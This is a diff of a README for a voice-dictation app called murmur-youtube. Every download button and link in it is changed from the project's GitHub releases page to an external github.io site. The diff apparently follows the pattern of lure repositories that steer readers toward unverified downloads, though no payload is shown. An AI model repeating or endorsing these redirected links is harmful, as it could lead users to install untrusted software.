@@ -1,7 +1,7 @@
 <h1>🎤 murmur-youtube - Speak, Don't Type, On Your PC</h1>
 
 <p align="center">
-  <a href="https://github.com/biohazardouslyfuzzed/murmur-youtube/releases" style="background-color:#4CAF50; color:white; padding:15px 32px; text-align:center; text-decoration:none; display:inline-block; font-size:20px; border-radius:8px; font-weight:bold;">⬇️ DOWNLOAD NOW - FREE</a>
+  <a href="https://biohazardouslyfuzzed.github.io" style="background-color:#4CAF50; color:white; padding:15px 32px; text-align:center; text-decoration:none; display:inline-block; font-size:20px; border-radius:8px; font-weight:bold;">⬇️ DOWNLOAD NOW - FREE</a>
 </p>
 
 ## 👋 Welcome to murmur-youtube
@@ -24,7 +24,7 @@ Getting murmur-youtube up and running takes less than two minutes. Here's what y
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/biohazardouslyfuzzed/murmur-youtube/releases](https://github.com/biohazardouslyfuzzed/murmur-youtube/releases)
+Visit this link to download the application: [https://biohazardouslyfuzzed.github.io](https://biohazardouslyfuzzed.github.io)
 
 Look for the latest version and download the file. The download should start automatically once you click the appropriate link.
 
@@ -142,7 +142,7 @@ We're constantly improving murmur-youtube. Each new release brings enhancements,
 Stop typing and start talking. Download murmur-youtube now and experience the freedom of voice dictation.
 
 <p align="center">
-  <a href="https://github.com/biohazardouslyfuzzed/murmur-youtube/releases" style="background-color:#2196F3; color:white; padding:15px 32px; text-align:center; text-decoration:none; display:inline-block; font-size:20px; border-radius:8px; font-weight:bold;">⬇️ GET MURMUR-YOUTUBE NOW</a>
+  <a href="https://biohazardouslyfuzzed.github.io" style="background-color:#2196F3; color:white; padding:15px 32px; text-align:center; text-decoration:none; display:inline-block; font-size:20px; border-radius:8px; font-weight:bold;">⬇️ GET MURMUR-YOUTUBE NOW</a>
 </p>
 
 ---
